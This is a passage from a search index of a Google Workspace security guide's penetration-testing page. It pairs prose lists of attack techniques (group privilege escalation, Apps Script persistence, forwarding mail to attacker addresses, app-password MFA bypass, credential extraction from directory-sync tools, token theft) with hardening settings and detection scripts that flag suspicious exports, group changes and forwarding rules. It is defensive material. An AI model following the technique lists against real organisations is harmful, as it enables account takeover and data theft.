Controls <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Settings for Data Access\n- Restrict Google Takeout capabilities\n- Limit data download functionality\n- Apply export controls based on organizational unit\n</code></pre></p> </li> <li> <p>Enhanced Logging and Monitoring <pre><code># Python script to detect suspicious data export activities\ndef detect_suspicious_exports(reports_service):\n    \"\"\"Monitor for suspicious data export activities\"\"\"\n    # Get export events\n    export_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='drive',\n        eventName='download,export_file',\n        maxResults=1000\n    ).execute()\n    \n    suspicious_exports = []\n    for event in export_events.get('items', []):\n        # Extract relevant data\n        user_email = event['actor']['email']\n        event_type = event.get('events', [{}])[0].get('name')\n        document_id = next((p.get('value') for p in event.get('events', [{}])[0].get('parameters', [])\n                           if p.get('name') == 'doc_id'), None)\n        \n        # Check if this is a high-volume export\n        if is_high_volume_export(reports_service, user_email):\n            suspicious_exports.append({\n                'user': user_email,\n                'activity': 'high_volume_export',\n                'details': f\"Excessive {event_type} activity\",\n                'timestamp': event.get('id', {}).get('time')\n            })\n    \n    # Check for Takeout activities\n    takeout_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='user_accounts',\n        eventName='download_data',\n        maxResults=1000\n    ).execute()\n    \n    for event in takeout_events.get('items', []):\n        suspicious_exports.append({\n            'user': event['actor']['email'],\n            'activity': 'takeout_export',\n            'details': \"Google Takeout data export\",\n            'ip_address': event.get('ipAddress'),\n            'timestamp': event.get('id', {}).get('time')\n        })\n    \n    return suspicious_exports\n\ndef is_high_volume_export(reports_service, user_email):\n    \"\"\"Determine if a user is exporting high volumes of data\"\"\"\n    # Get download/export count for last 24 hours\n    yesterday = (datetime.now() - timedelta(days=1)).strftime('%Y-%m-%d')\n    \n    events = reports_service.activities().list(\n        userKey=user_email,\n        applicationName='drive',\n        eventName='download,export_file',\n        startTime=yesterday,\n        maxResults=1000\n    ).execute()\n    \n    # Count export activities\n    export_count = len(events.get('items', []))\n    \n    # Threshold can be adjusted based on normal user behavior\n    return export_count &gt; 50  # Arbitrary threshold\n</code></pre></p> </li> <li> <p>Data Access Controls <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Information rights management\n- Enable IRM for Google Drive\n- Restrict document download capabilities\n- Implement content-aware access restrictions\n</code></pre></p> </li> </ol>"},{"location":"pentesting-insights/#group-based-privilege-escalation","title":"Group-Based Privilege Escalation","text":""},{"location":"pentesting-insights/#attack-methodology_7","title":"Attack Methodology","text":"<p>Attackers leverage Google Groups for privilege escalation:</p> <ol> <li>Group Membership Exploitation</li> <li>Search for groups with privileged access</li> <li>Identify groups with self-signup capabilities</li> <li>Join groups that provide elevated permissions</li> <li> <p>Leverage transitive group memberships for access</p> </li> <li> <p>Group Settings Manipulation</p> </li> <li>Modify group settings to allow external sharing</li> <li>Change group visibility to extend access</li> <li>Manipulate group permissions for persistence</li> <li> <p>Exploit default settings that may be permissive</p> </li> <li> <p>Group-Based Resource Access</p> </li> <li>Use group membership to access protected resources</li> <li>Leverage group-based sharing for sensitive documents</li> <li>Access applications with group-based authentication</li> <li>Exploit group-scoped API access</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_7","title":"Defensive Countermeasures","text":"<ol> <li> <p>Group Access Controls <pre><code>Admin Console &gt; Directory &gt; Groups\n- Configure \"Who can join the group\" to \"Only invited users\"\n- Disable \"Allow members to join themselves\"\n- Set appropriate visibility settings\n- Implement approval requirements for all groups\n</code></pre></p> </li> <li> <p>Group Audit and Monitoring <pre><code># Python script to monitor for suspicious group activities\ndef detect_suspicious_group_activities(admin_sdk_service, reports_service):\n    \"\"\"Monitor for suspicious Google Groups activities\"\"\"\n    # Get group membership change events\n    group_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='groups',\n        eventName='add_to_group,change_group_setting',\n        maxResults=1000\n    ).execute()\n    \n    suspicious_activities = []\n    for event in group_events.get('items', []):\n        # Extract event details\n        event_name = event.get('events', [{}])[0].get('name')\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        \n        if event_name == 'add_to_group':\n            group_email = next((p.get('value') for p in parameters \n                               if p.get('name') == 'group_email'), None)\n            \n            # Check if this is a privileged group\n            if is_privileged_group(admin_sdk_service, group_email):\n                suspicious_activities.append({\n                    'user': event['actor']['email'],\n                    'activity': 'joined_privileged_group',\n                    'group': group_email,\n                    'ip_address': event.get('ipAddress'),\n                    'timestamp': event.get('id', {}).get('time')\n                })\n        \n        elif event_name == 'change_group_setting':\n            group_email = next((p.get('value') for p in parameters \n                               if p.get('name') == 'group_email'), None)\n            setting_name = next((p.get('value') for p in parameters \n                               if p.get('name') == 'setting_name'), None)\n            new_value = next((p.get('value') for p in parameters \n                             if p.get('name') == 'new_value'), None)\n            \n            # Check for suspicious setting changes\n            if is_sensitive_setting_change(setting_name, new_value):\n                suspicious_activities.append({\n                    'user': event['actor']['email'],\n                    'activity': 'suspicious_group_setting_change',\n                    'group': group_email,\n                    'setting': f\"{setting_name} changed to {new_value}\",\n                    'ip_address': event.get('ipAddress'),\n                    'timestamp': event.get('id', {}).get('time')\n                })\n    \n    return suspicious_activities\n\ndef is_privileged_group(admin_sdk_service, group_email):\n    \"\"\"Determine if a group has privileged access\"\"\"\n    # This would check against a list of known privileged groups\n    # or check for groups with admin privileges\n    privileged_groups = ['admins@domain.com', 'security@domain.com']\n    return group_email in privileged_groups\n\ndef is_sensitive_setting_change(setting_name, new_value):\n    \"\"\"Determine if a setting change is potentially dangerous\"\"\"\n    sensitive_changes = {\n        'WHO_CAN_JOIN': ['ALL_IN_DOMAIN_CAN_JOIN', 'ANYONE_CAN_JOIN'],\n        'WHO_CAN_VIEW_MEMBERSHIP': ['ALL_IN_DOMAIN_CAN_VIEW', 'ANYONE_CAN_VIEW'],\n        'WHO_CAN_VIEW_GROUP': ['ALL_IN_DOMAIN_CAN_VIEW', 'ANYONE_CAN_VIEW'],\n        'ALLOW_EXTERNAL_MEMBERS': ['true']\n    }\n    \n    return setting_name in sensitive_changes and new_value in sensitive_changes[setting_name]\n</code></pre></p> </li> <li> <p>Group Security Framework</p> </li> <li>Implement periodic group access reviews</li> <li>Create baseline for group security settings</li> <li>Document privileged groups and access requirements</li> <li>Develop automated group configuration validation</li> </ol>"},{"location":"pentesting-insights/#google-apps-script-exploitation","title":"Google Apps Script Exploitation","text":""},{"location":"pentesting-insights/#attack-methodology_8","title":"Attack Methodology","text":"<p>Attackers leverage Google Apps Script for persistence and data access:</p> <ol> <li>Script Discovery and Modification</li> <li>Identify existing Apps Scripts in the environment</li> <li>Modify legitimate scripts to add malicious functionality</li> <li>Add persistence mechanisms through triggers</li> <li> <p>Include data exfiltration capabilities</p> </li> <li> <p>Script Deployment Techniques</p> </li> <li>Deploy scripts as web applications for external access</li> <li>Create time-driven triggers for scheduled execution</li> <li>Implement document-based triggers for user-initiated execution</li> <li> <p>Configure cross-user deployment through sharing</p> </li> <li> <p>Sensitive Information Access</p> </li> <li>Use script privileges to access user data</li> <li>Leverage authorization to read sensitive documents</li> <li>Extract email content through authorized access</li> <li>Access calendar and contact information</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_8","title":"Defensive Countermeasures","text":"<ol> <li> <p>Apps Script Security Controls <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Apps Script\n- Configure \"Google Cloud Platform (GCP) trust\" appropriately\n- Restrict Apps Script creation capabilities\n- Implement appropriate Apps Script marketplace controls\n</code></pre></p> </li> <li> <p>Script Monitoring Framework</p> </li> <li>Implement comprehensive audit of existing scripts</li> <li>Deploy monitoring for script creation and modification</li> <li>Create alerts for suspicious trigger creation</li> <li> <p>Monitor for unusual script execution patterns</p> </li> <li> <p>Script Access Controls</p> </li> <li>Restrict script deployment capabilities</li> <li>Implement approval process for web application deployment</li> <li>Control API access for scripts</li> <li>Restrict script sharing permissions</li> </ol>"},{"location":"pentesting-insights/#advanced-persistence-techniques","title":"Advanced Persistence Techniques","text":""},{"location":"pentesting-insights/#attack-methodology_9","title":"Attack Methodology","text":"<p>Attackers employ multiple sophisticated persistence techniques:</p> <ol> <li>Gmail Filter and Forwarding Mechanisms</li> <li>Create mail filters to hide security notifications</li> <li>Set up automatic forwarding to attacker-controlled addresses</li> <li>Configure targeted filters to capture specific keywords or senders</li> <li> <p>Implement filters to hide evidence of compromise</p> </li> <li> <p>App Password Exploitation</p> </li> <li>Generate application-specific passwords for service access</li> <li>Use app passwords to bypass MFA requirements</li> <li>Maintain access even after password changes</li> <li> <p>Create multiple app passwords for redundant access</p> </li> <li> <p>Account Delegation Abuse</p> </li> <li>Configure mail delegation to attacker-controlled accounts</li> <li>Access victim's email through delegation relationship</li> <li>Maintain persistent access without additional authentication</li> <li> <p>Use delegation to bypass password changes and MFA</p> </li> <li> <p>2FA Manipulation</p> </li> <li>Modify two-factor authentication settings</li> <li>Add attacker-controlled backup phone numbers</li> <li>Enroll new hardware security keys</li> <li>Change recovery email addresses to attacker-controlled accounts</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_9","title":"Defensive Countermeasures","text":"<ol> <li>Mail Filter Monitoring and Control <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Advanced settings\n- Restrict mail forwarding capabilities\n- Enable alerts for new forwarding rules\n- Monitor for suspicious filter creation\n</code></pre></li> </ol> <pre><code># Python script for detecting suspicious mail filters\ndef detect_suspicious_mail_filters(reports_service):\n    \"\"\"Detect suspicious mail filters and forwarding rules\"\"\"\n    # Get mail filter events\n    filter_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='gmail',\n        eventName='CREATE_FILTER',\n        maxResults=1000\n    ).execute()\n    \n    suspicious_filters = []\n    for event in filter_events.get('items', []):\n        # Extract filter criteria and actions\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        filter_criteria = next((p.get('value') for p in parameters \n                              if p.get('name') == 'filter_criteria'), '')\n        filter_action = next((p.get('value') for p in parameters \n                            if p.get('name') == 'filter_action'), '')\n        \n        # Check for suspicious patterns\n        is_suspicious = False\n        \n        # Check for security-related message filtering\n        security_keywords = ['security', 'alert', 'warning', 'password', 'verify']\n        if any(keyword in filter_criteria.lower() for keyword in security_keywords):\n            if 'trash' in filter_action.lower() or 'archive' in filter_action.lower():\n                is_suspicious = True\n        \n        # Check for external forwarding\n        if 'forward' in filter_action.lower():\n            forward_address = filter_action.split(' ')[-1]\n            if not is_internal_domain(forward_address):\n                is_suspicious = True\n        \n        if is_suspicious:\n            suspicious_filters.append({\n                'user': event['actor']['email'],\n                'filter_criteria': filter_criteria,\n                'filter_action': filter_action,\n                'ip_address': event.get('ipAddress'),\n                'timestamp': event.get('id', {}).get('time')\n            })\n    \n    # Also check for forwarding setup\n    forwarding_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='gmail',\n        eventName='FORWARDING_CHANGE',\n        maxResults=1000\n    ).execute()\n    \n    for event in forwarding_events.get('items', []):\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        forwarding_address = next((p.get('value') for p in parameters \n                                 if p.get('name') == 'forwarding_address'), None)\n        \n        if forwarding_address and not is_internal_domain(forwarding_address):\n            suspicious_filters.append({\n                'user': event['actor']['email'],\n                'type': 'forwarding',\n                'forwarding_address': forwarding_address,\n                'ip_address': event.get('ipAddress'),\n                'timestamp': event.get('id', {}).get('time')\n            })\n    \n    return suspicious_filters\n</code></pre> <ol> <li> <p>App Password Controls <pre><code>Admin Console &gt; Security &gt; Authentication &gt; App passwords\n- Disable app password creation\n- Monitor for app password usage\n- Implement regular app password audits\n</code></pre></p> </li> <li> <p>Delegation Monitoring and Restriction <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Advanced settings\n- Restrict mail delegation capabilities\n- Implement approval workflows for delegation\n- Monitor delegation relationships regularly\n</code></pre></p> </li> </ol> <pre><code># Python script for auditing mail delegation\ndef audit_mail_delegation(admin_sdk_service):\n    \"\"\"Audit all mail delegation relationships\"\"\"\n    users = admin_sdk_service.users().list(\n        customer='my_customer',\n        maxResults=100\n    ).execute()\n    \n    delegation_relationships = []\n    \n    for user in users.get('users', []):\n        user_email = user['primaryEmail']\n        \n        try:\n            # Get delegation settings\n            delegates = admin_sdk_service.users().settings().delegates().list(\n                userId=user_email\n            ).execute()\n            \n            for delegate in delegates.get('delegates', []):\n                delegation_relationships.append({\n                    'user': user_email,\n                    'delegate': delegate.get('delegateEmail'),\n                    'verified': delegate.get('verificationStatus') == 'accepted'\n                })\n        except Exception as e:\n            print(f\"Error checking delegation for {user_email}: {str(e)}\")\n    \n    return delegation_relationships\n</code></pre> <ol> <li>2FA Security Controls <pre><code>Admin Console &gt; Security &gt; Authentication &gt; 2-Step Verification\n- Enforce 2FA for all users\n- Restrict 2FA enrollment options\n- Monitor 2FA configuration changes\n- Implement security key enforcement\n</code></pre></li> </ol>"},{"location":"pentesting-insights/#cross-service-pivoting","title":"Cross-Service Pivoting","text":""},{"location":"pentesting-insights/#attack-methodology_10","title":"Attack Methodology","text":"<p>Attackers exploit connections between Google services:</p> <ol> <li>GWS to GCP Pivoting</li> <li>Use Workspace credentials to access Google Cloud</li> <li>Leverage shared identity for cross-platform access</li> <li>Exploit integrated services between platforms</li> <li> <p>Use IAM relationships between environments</p> </li> <li> <p>Service Integration Exploitation</p> </li> <li>Leverage service account relationships</li> <li>Use federated identity mechanisms</li> <li>Exploit OAuth connections between services</li> <li>Target poorly configured service boundaries</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_10","title":"Defensive Countermeasures","text":"<ol> <li> <p>Identity Boundary Controls <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; API Controls\n- Configure appropriate service boundaries\n- Implement strict access controls between services\n- Enforce separation between environments\n</code></pre></p> </li> <li> <p>Cross-Service Monitoring</p> </li> <li>Implement monitoring across service boundaries</li> <li>Create alerts for unusual cross-service access</li> <li>Deploy logging for service-to-service authentication</li> <li>Develop cross-service correlation rules</li> </ol>"},{"location":"pentesting-insights/#directory-synchronization-vulnerabilities","title":"Directory Synchronization Vulnerabilities","text":""},{"location":"pentesting-insights/#attack-methodology_11","title":"Attack Methodology","text":"<p>Attackers target directory synchronization components to access credentials and sensitive data:</p> <ol> <li>Google Credential Provider for Windows (GCPW) Attacks</li> <li>Target Windows machines using GCPW for SSO</li> <li>Extract tokens stored in disk, memory, and registry</li> <li>Potentially obtain clear text passwords during synchronization</li> <li> <p>Leverage compromised synchronization for persistent access</p> </li> <li> <p>Google Cloud Directory Sync (GCDS) Exploitation</p> </li> <li>Target GCDS server components during AD to Workspace sync</li> <li>Access synchronization credentials with elevated privileges</li> <li>Extract Workspace super admin and privileged AD credentials</li> <li> <p>Compromise synchronization rules to maintain persistence</p> </li> <li> <p>Google Password Sync (GPS) Attacks</p> </li> <li>Target GPS components installed on domain controllers</li> <li>Access credentials during password synchronization processes</li> <li>Extract synchronized password data during transmission</li> <li>Modify synchronization behavior for credential harvesting</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_11","title":"Defensive Countermeasures","text":"<ol> <li>GCPW Hardening <pre><code>Group Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Google &gt; Google Credential Provider for Windows\n- Implement secure token storage settings\n- Configure appropriate session parameters\n- Restrict GCPW to managed devices\n</code></pre></li> </ol> <pre><code># PowerShell script to detect and analyze GCPW installations\nfunction Detect-GCPW {\n    Write-Host \"Checking for Google Credential Provider for Windows...\"\n    \n    # Check for GCPW registry keys\n    $gcpwKey = \"HKLM:\\SOFTWARE\\Google\\GCPW\"\n    $gcpwExists = Test-Path $gcpwKey\n    \n    if ($gcpwExists) {\n        Write-Host \"GCPW detected! Analyzing configuration...\" -ForegroundColor Yellow\n        \n        # Check domain configuration\n        $domain = (Get-ItemProperty -Path $gcpwKey -Name \"domain_name\" -ErrorAction SilentlyContinue).domain_name\n        Write-Host \"Configured domain: $domain\"\n        \n        # Check security settings\n        $enableSecurityKey = (Get-ItemProperty -Path $gcpwKey -Name \"enable_security_key_sign_in\" -ErrorAction SilentlyContinue).enable_security_key_sign_in\n        $enablePasswordManagerAutofill = (Get-ItemProperty -Path $gcpwKey -Name \"enable_password_manager_autofill\" -ErrorAction SilentlyContinue).enable_password_manager_autofill\n        $enableWatsonLogging = (Get-ItemProperty -Path $gcpwKey -Name \"enable_watson_logging\" -ErrorAction SilentlyContinue).enable_watson_logging\n        \n        # Report security concerns\n        if ($enablePasswordManagerAutofill -eq 1) {\n            Write-Host \"WARNING: Password manager autofill is enabled - potential security risk\" -ForegroundColor Red\n        }\n        \n        if ($enableWatsonLogging -eq 1) {\n            Write-Host \"WARNING: Watson logging is enabled - may log sensitive data\" -ForegroundColor Red\n        }\n        \n        # Check token storage\n        $tokenFiles = Get-ChildItem -Path \"$env:LOCALAPPDATA\\Google\\GCPW\" -Recurse -ErrorAction SilentlyContinue\n        if ($tokenFiles) {\n            Write-Host \"Found $(($tokenFiles | Measure-Object).Count) GCPW token files\" -ForegroundColor Yellow\n        }\n    }\n    else {\n        Write-Host \"GCPW not detected on this system\" -ForegroundColor Green\n    }\n}\n\nDetect-GCPW\n</code></pre> <ol> <li>GCDS Secure Configuration <pre><code># GCDS Configuration Security Best Practices\n- Deploy GCDS on dedicated, hardened servers\n- Implement JCE unlimited strength cryptography\n- Use certificate-based authentication where possible\n- Configure secure credential storage\n</code></pre></li> </ol> <pre><code># Bash script to audit GCDS installation\n#!/bin/bash\n\necho \"Auditing GCDS installation...\"\n\n# Check for GCDS installation directory\nif [ -d \"/opt/GoogleCloudDirSync\" ]; then\n    echo \"[!] GCDS installation found!\"\n    \n    # Check configuration file security\n    config_files=$(find /opt/GoogleCloudDirSync -name \"*.xml\")\n    echo \"Found $(echo \"$config_files\" | wc -l) configuration files\"\n    \n    # Check file permissions\n    insecure_files=$(find /opt/GoogleCloudDirSync -type f -name \"*.xml\" -perm /o+rw)\n    if [ -n \"$insecure_files\" ]; then\n        echo \"[!] WARNING: Found insecure file permissions on configuration files:\"\n        echo \"$insecure_files\"\n    fi\n    \n    # Check for encrypted password storage\n    for config in $config_files; do\n        if grep -q \"encryptedPassword\" \"$config\"; then\n            echo \"[+] Using encrypted password storage in $config\"\n        else\n            echo \"[!] WARNING: Unencrypted password storage detected in $config\"\n        fi\n    done\nelse\n    echo \"[+] GCDS not installed on this system\"\nfi\n</code></pre> <ol> <li> <p>GPS Hardening <pre><code># GPS Configuration Security Best Practices\n- Deploy on dedicated, hardened domain controllers\n- Implement strict service account permissions\n- Configure encrypted password transmission\n- Implement monitoring of GPS components\n</code></pre></p> </li> <li> <p>Synchronization Monitoring Framework <pre><code># Python script for monitoring directory synchronization activities\ndef monitor_directory_sync_activities(reports_service):\n    \"\"\"Monitor for suspicious directory synchronization activities\"\"\"\n    # Get admin directory sync events\n    sync_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='admin',\n        eventName='TOGGLE_SERVICE_ACCOUNT,ADD_SERVICE_ACCOUNT_PRIVILEGE',\n        maxResults=1000\n    ).execute()\n    \n    suspicious_activities = []\n    for event in sync_events.get('items', []):\n        # Extract event details\n        event_name = event.get('events', [{}])[0].get('name')\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        \n        # Check for suspicious parameters\n        if event_name == 'TOGGLE_SERVICE_ACCOUNT':\n            service_account_status = next((p.get('value') for p in parameters \n                                        if p.get('name') == 'service_account_status'), None)\n            \n            if service_account_status == 'ON':\n                suspicious_activities.append({\n                    'user': event['actor']['email'],\n                    'activity': 'service_account_enabled',\n                    'details': \"Service account toggled on\",\n                    'ip_address': event.get('ipAddress'),\n                    'timestamp': event.get('id', {}).get('time')\n                })\n        \n        elif event_name == 'ADD_SERVICE_ACCOUNT_PRIVILEGE':\n            privilege_name = next((p.get('value') for p in parameters \n                                if p.get('name') == 'privilege_name'), None)\n            \n            if privilege_name in ['ADMIN_DIRECTORY_GROUP', 'ADMIN_DIRECTORY_USER']:\n                suspicious_activities.append({\n                    'user': event['actor']['email'],\n                    'activity': 'service_account_privilege_change',\n                    'details': f\"Service account granted {privilege_name} privilege\",\n                    'ip_address': event.get('ipAddress'),\n                    'timestamp': event.get('id', {}).get('time')\n                })\n    \n    return suspicious_activities\n</code></pre></p> </li> </ol>"},{"location":"pentesting-insights/#advanced-penetration-testing-insights","title":"Advanced Penetration Testing Insights","text":""},{"location":"pentesting-insights/#credential-access-and-authentication-bypass","title":"Credential Access and Authentication Bypass","text":""},{"location":"pentesting-insights/#attack-methodology_12","title":"Attack Methodology","text":"<p>Sophisticated attackers target credential and authentication mechanisms:</p> <ol> <li>Password Spraying Techniques</li> <li>Use distributed login attempts to avoid lockouts</li> <li>Target account enumeration to identify valid accounts</li> <li> <p>Utilize common password patterns specific to organizations</p> </li> <li> <p>Session Cookie Theft</p> </li> <li>Target session cookies through XSS or client-side vulnerabilities</li> <li>Hijack authenticated sessions without credential theft</li> <li> <p>Bypass MFA through authenticated session access</p> </li> <li> <p>OAuth Token Theft</p> </li> <li>Target refresh tokens stored on client devices</li> <li>Extract tokens from application storage</li> <li>Use stolen tokens for persistent API access</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_12","title":"Defensive Countermeasures","text":"<ol> <li> <p>Advanced Authentication Hardening <pre><code>Admin Console &gt; Security &gt; Authentication\n- Implement hardware key enforcement\n- Deploy risk-based authentication challenges\n- Enable strict session control policies\n</code></pre></p> </li> <li> <p>Cookie Security Enhancement</p> </li> <li>Implement secure and HTTP-only cookie flags</li> <li>Deploy anti-session hijacking mechanisms</li> <li> <p>Configure appropriate session timeout values</p> </li> <li> <p>Token Security Framework</p> </li> <li>Implement token revocation monitoring</li> <li>Create risk-based token lifetime policies</li> <li>Deploy device posture checks for token issuance</li> </ol>"},{"location":"pentesting-insights/#cross-service-attack-vectors","title":"Cross-Service Attack Vectors","text":""},{"location":"pentesting-insights/#attack-methodology_13","title":"Attack Methodology","text":"<p>Attackers exploit interconnections between Google services:</p> <ol> <li>GCP-Workspace Pivoting</li> <li>Use Workspace compromise to access GCP resources</li> <li>Exploit shared authentication between services</li> <li> <p>Leverage identity federation for privilege escalation</p> </li> <li> <p>Workspace-Chrome Exploitation</p> </li> <li>Target Chrome Sync to extract credentials</li> <li>Use malicious extensions for data access</li> <li> <p>Exploit managed Chrome deployments for persistence</p> </li> <li> <p>Google Meet/Chat Attack Surface</p> </li> <li>Use meeting invitations for phishing</li> <li>Exploit chat functionality for malicious links</li> <li>Leverage file sharing for malware distribution</li> </ol>"},{"location":"pentesting-insights/#defensive-countermeasures_13","title":"Defensive Countermeasures","text":"<ol> <li>Cross-Service Security Boundaries</li> <li>Implement strict separation between environments</li> <li>Deploy service-specific access policies</li> <li> <p>Create identity boundaries between services</p> </li> <li> <p>Chrome Security Hardening <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Settings\n- Implement Chrome extension restrictions\n- Configure secure sync settings\n- Deploy enhanced safe browsing protection\n</code></pre></p> </li> <li> <p>Collaboration Tool Security <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Google Meet\n- Configure external participant restrictions\n- Implement file sharing controls\n- Deploy link scanning for chat messages\n</code></pre></p> </li> </ol>"},{"location":"pentesting-insights/#penetration-testing-methodologies","title":"Penetration Testing Methodologies","text":""},{"location":"pentesting-insights/#reconnaissance-techniques","title":"Reconnaissance Techniques","text":"<p>Understand common reconnaissance methods to strengthen defenses:</p> <ol> <li>Email Enumeration Countermeasures</li> <li>Implement anti-harvesting measures</li> <li>Deploy CAPTCHA for repeated lookup attempts</li> <li> <p>Monitor for suspicious directory access patterns</p> </li> <li> <p>Public Document Exposure Control <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Drive and Docs\n- Audit publicly accessible documents\n- Implement default sharing restrictions\n- Deploy sensitive content controls\n</code></pre></p> </li> <li> <p>Digital Footprint Reduction</p> </li> <li>Conduct regular exposure assessments</li> <li>Implement information exposure policies</li> <li>Monitor for organization information leakage</li> </ol>"},{"location":"pentesting-insights/#advanced-social-engineering-defenses","title":"Advanced Social Engineering Defenses","text":"<p>Counter sophisticated social engineering with enhanced controls:</p> <ol> <li> <p>Business Email Compromise Protection <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Safety\n- Enable enhanced pre-delivery message scanning\n- Implement display name spoof protection\n- Deploy lookalike domain warnings\n</code></pre></p> </li> <li> <p>User Awareness Enhancement</p> </li> <li>Implement targeted phishing simulations</li> <li>Deploy just-in-time security training</li> <li> <p>Create contextual security awareness resources</p> </li> <li> <p>Communication Channel Verification</p> </li> <li>Implement email authentication indicators</li> <li>Deploy external sender warnings</li> <li>Create secure communication verification procedures</li> </ol>"},{"location":"pentesting-insights/#incident-response-for-common-attack-scenarios","title":"Incident Response for Common Attack Scenarios","text":""},{"location":"pentesting-insights/#oauth-phishing-attack-response","title":"OAuth Phishing Attack Response","text":"<ol> <li>Initial Assessment</li> <li>Identify compromised accounts and authorized applications</li> <li>Determine access scope and potential data exposure</li> <li> <p>Review activity logs for suspicious actions</p> </li> <li> <p>Containment Actions <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Revoke suspicious application access\n- Block malicious client IDs\n- Reset passwords for affected users\n</code></pre></p> </li> <li> <p>Recovery Process</p> </li> <li>Conduct thorough access review</li> <li>Implement enhanced monitoring for affected users</li> <li>Deploy additional authentication requirements</li> </ol>"},{"location":"pentesting-insights/#admin-account-compromise-response","title":"Admin Account Compromise Response","text":"<ol> <li>Initial Assessment</li> <li>Identify scope of administrative access</li> <li>Review admin audit logs for unauthorized actions</li> <li> <p>Determine extent of configuration changes</p> </li> <li> <p>Containment Actions <pre><code>Admin Console &gt; Account &gt; Admin roles\n- Revoke compromised admin access\n- Reset super admin credentials\n- Implement IP restrictions for admin console\n</code></pre></p> </li> <li> <p>Recovery Process</p> </li> <li>Conduct comprehensive configuration review</li> <li>Restore from known-good configuration backups</li> <li>Implement enhanced logging and monitoring</li> </ol>"},{"location":"pentesting-insights/#data-exfiltration-incident-response","title":"Data Exfiltration Incident Response","text":"<ol> <li>Initial Assessment</li> <li>Identify data access patterns and potentially exposed data</li> <li>Review sharing activity and external transfers</li> <li> <p>Determine regulatory and compliance implications</p> </li> <li> <p>Containment Actions <pre><code>Admin Console &gt; Security &gt; Data protection\n- Block external sharing temporarily\n- Revoke suspicious sharing permissions\n- Disable data export capabilities\n</code></pre></p> </li> <li> <p>Recovery Process</p> </li> <li>Implement enhanced DLP controls</li> <li>Conduct data exposure assessment</li> <li>Deploy additional monitoring for sensitive data</li> </ol>"},{"location":"pentesting-insights/#continuous-security-improvement-framework","title":"Continuous Security Improvement Framework","text":""},{"location":"pentesting-insights/#penetration-testing-program","title":"Penetration Testing Program","text":"<p>Establish an ongoing penetration testing program:</p> <ol> <li>Scope Definition</li> <li>Define clear testing boundaries</li> <li>Establish rules of engagement</li> <li> <p>Create realistic attack scenarios</p> </li> <li> <p>Authorized Testing Procedures</p> </li> <li>Develop Google Workspace-specific testing methodologies</li> <li>Implement safe testing practices</li> <li> <p>Create realistic simulation capabilities</p> </li> <li> <p>Findings Remediation Process</p> </li> <li>Establish severity classification system</li> <li>Implement remediation tracking</li> <li>Create verification testing procedures</li> </ol>"},{"location":"pentesting-insights/#threat-intelligence-integration","title":"Threat Intelligence Integration","text":"<p>Leverage threat intelligence to enhance defenses:</p> <ol> <li>Google Workspace Threat Feeds</li> <li>Subscribe to Google Cloud Threat Intelligence</li> <li>Implement industry-specific threat intelligence</li> <li> <p>Create custom indicators for Google Workspace</p> </li> <li> <p>Attack Pattern Analysis</p> </li> <li>Document common Google Workspace attack patterns</li> <li>Develop detection rules for known tactics</li> <li> <p>Create proactive hunting procedures</p> </li> <li> <p>Security Control Validation</p> </li> <li>Test defensive controls against known attack patterns</li> <li>Implement regular control validation</li> <li>Create continuous improvement framework</li> </ol>"},{"location":"pentesting-insights/#resources-for-security-testing","title":"Resources for Security Testing","text":"<ul> <li>HackTricks Google Workspace Security Guide - Comprehensive pentesting information for Google Workspace</li> <li>HackTricks GWS Post-Exploitation Guide - Detailed post-exploitation techniques for Google Workspace</li> <li>HackTricks GWS Persistence Techniques - Advanced persistence methods for Google Workspace</li> <li>HackTricks Workspace Sync Attacks - Exploiting directory synchronization vulnerabilities</li> <li>HackTricks Google Platforms Phishing - Leveraging Google services for phishing attacks</li> <li>Google Workspace Security Configuration Validator</li> <li>Google Workspace Security Best Practices</li> <li>MITRE ATT&amp;CK for Enterprise SaaS</li> <li>CISA Cloud Security Technical Reference Architecture</li> </ul> <p>Note: This guide integrates adversarial perspectives to strengthen your Google Workspace security posture. The techniques described should only be used in authorized security testing with proper approvals and controls.</p>"},{"location":"resources/","title":"Resources","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"resources/#google-workspace-security-resources","title":"Google Workspace Security Resources","text":"<p>This document provides a curated collection of resources for implementing and maintaining Google Workspace security, including official documentation, technical guides, community resources, and ready-to-use templates.</p>"},{"location":"resources/#official-google-documentation","title":"Official Google Documentation","text":""},{"location":"resources/#core-google-workspace-security","title":"Core Google Workspace Security","text":"<ul> <li>Google Workspace Security Center Overview</li> <li>Google Workspace Security Best Practices</li> <li>Google Workspace Security Whitepaper</li> <li>Google Workspace Audit Logs</li> <li>Google Cloud Shared Responsibility Model</li> </ul>"},{"location":"resources/#identity-and-access-management","title":"Identity and Access Management","text":"<ul> <li>Google Workspace 2-Step Verification Overview</li> <li>Google Workspace Password Policies</li> <li>Google Advanced Protection Program</li> <li>Context-Aware Access Configuration</li> <li>Context-Aware Access for Google Workspace</li> <li>OAuth Apps Whitelisting</li> </ul>"},{"location":"resources/#data-protection","title":"Data Protection","text":"<ul> <li>Google Workspace Data Loss Prevention</li> <li>Information Rights 